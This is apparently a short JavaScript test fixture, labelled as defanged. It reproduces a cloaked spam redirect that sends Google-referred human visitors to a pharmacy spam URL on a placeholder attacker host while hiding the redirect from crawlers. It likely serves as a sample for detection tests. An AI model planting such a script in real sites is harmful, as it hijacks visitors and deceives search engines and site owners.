// DEFANGED TEST FIXTURE: redirect only real visitors coming from Google, never crawlers.
if (document.referrer.indexOf("google.") > -1 && !/bot|crawl/i.test(navigator.userAgent)) {
  window.location.href = "https://cheap-pharma.attacker.invalid/?r=1";
}
